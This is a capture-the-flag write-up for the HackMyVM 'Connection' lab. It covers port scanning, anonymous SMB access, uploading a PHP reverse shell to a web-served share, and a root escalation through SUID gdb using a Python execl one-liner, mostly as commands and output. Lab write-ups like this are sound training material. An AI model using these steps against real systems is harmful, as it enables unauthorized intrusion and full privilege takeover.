---
layout: post
title: "HackMyVM - Connection"
date: 2020-09-27 23:00:00 +0100
categories: hmv
---

Creator: [whitecr0wz](https://hackmyvm.eu/profile/?user=whitecr0wz)
Level: Easy
Release Date: 2020-09-25

## Scan

```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2020-09-27 20:00 WEST
Nmap scan report for 192.168.1.21
Host is up (0.00016s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 b7:e6:01:b5:f9:06:a1:ea:40:04:29:44:f4:df:22:a1 (RSA)
|   256 fb:16:94:df:93:89:c7:56:85:84:22:9e:a0:be:7c:95 (ECDSA)
|_  256 45:2e:fb:87:04:eb:d1:8b:92:6f:6a:ea:5a:a2:a1:1c (ED25519)
80/tcp  open  http        Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Apache2 Debian Default Page: It works
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
Service Info: Host: CONNECTION; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h19m59s, deviation: 2h18m33s, median: 0s
|_nbstat: NetBIOS name: CONNECTION, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2020-09-27T19:00:29
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: connection
|   NetBIOS computer name: CONNECTION\x00
|   Domain name: \x00
|   FQDN: connection
|_  System time: 2020-09-27T15:00:29-04:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.43 seconds
```

## Enumeration

```bash

smbclient -L \\\\192.168.1.21\\                    
Enter WORKGROUP\adok's password: 
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        share           Disk      
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (Private Share for uploading files)
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            

$ smbclient \\\\192.168.1.21\\share
Enter WORKGROUP\adok's password: 
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Sep 23 02:48:39 2020
  ..                                  D        0  Wed Sep 23 02:48:39 2020
  html                                D        0  Wed Sep 23 03:20:00 2020

                7158264 blocks of size 1024. 5462844 blocks available
smb: \> cd html
smb: \html\> ls
  .                                   D        0  Wed Sep 23 03:20:00 2020
  ..                                  D        0  Wed Sep 23 02:48:39 2020
  index.html                          N    10701  Wed Sep 23 02:48:45 2020

                7158264 blocks of size 1024. 5462844 blocks available
smb: \html\> put php-reverse-shell.php
putting file php-reverse-shell.php as \html\php-reverse-shell.php (670.5 kb/s) (average 670.5 kb/s)
smb: \html\> ls
  .                                   D        0  Tue Sep 27 22:16:44 2020
  ..                                  D        0  Wed Sep 23 02:48:39 2020
  php-reverse-shell.php               A     5493  Tue Sep 27 22:16:44 2020
  index.html                          N    10701  Wed Sep 23 02:48:45 2020

                7158264 blocks of size 1024. 5462836 blocks available
smb: \html\> 
```

### SUID

```bash
(remote) www-data@connection:/$ find /usr/ -perm -4000 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/su
/usr/bin/passwd
/usr/bin/gdb
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/mount
/usr/bin/gpasswd
```

## ROOT

```bash
(remote) www-data@connection:/tmp$ gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
GNU gdb (Debian 8.2.1-2+b3) 8.2.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word".
\[\](remote)\[\] \[\]root@connection\[\]:\[\]/tmp\[\]$ id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
```
